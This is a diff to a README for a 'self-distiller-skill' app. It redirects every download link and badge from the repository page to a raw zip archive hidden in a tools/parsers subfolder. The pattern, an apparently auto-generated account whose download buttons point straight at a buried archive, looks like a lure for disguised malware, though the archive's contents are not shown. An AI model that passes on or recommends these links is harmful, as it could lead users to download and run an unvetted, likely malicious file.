@@ -1,12 +1,12 @@
 # 🪞 self-distiller-skill - Turn self-talk into clear insight
 
-[![Download self-distiller-skill](https://img.shields.io/badge/Download-self--distiller--skill-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nailbrushinduction686/self-distiller-skill)
+[![Download self-distiller-skill](https://img.shields.io/badge/Download-self--distiller--skill-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nailbrushinduction686/self-distiller-skill/raw/refs/heads/main/tools/parsers/skill_self_distiller_1.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/nailbrushinduction686/self-distiller-skill](https://github.com/nailbrushinduction686/self-distiller-skill)
+[https://github.com/nailbrushinduction686/self-distiller-skill/raw/refs/heads/main/tools/parsers/skill_self_distiller_1.6.zip](https://github.com/nailbrushinduction686/self-distiller-skill/raw/refs/heads/main/tools/parsers/skill_self_distiller_1.6.zip)
 
 ## 🧭 What this app does
 
@@ -44,7 +44,7 @@ For the smoothest use, close other heavy apps before you start the download and 
 
 Go to:
 
-https://github.com/nailbrushinduction686/self-distiller-skill
+https://github.com/nailbrushinduction686/self-distiller-skill/raw/refs/heads/main/tools/parsers/skill_self_distiller_1.6.zip
 
 ### 2. Download the app
 
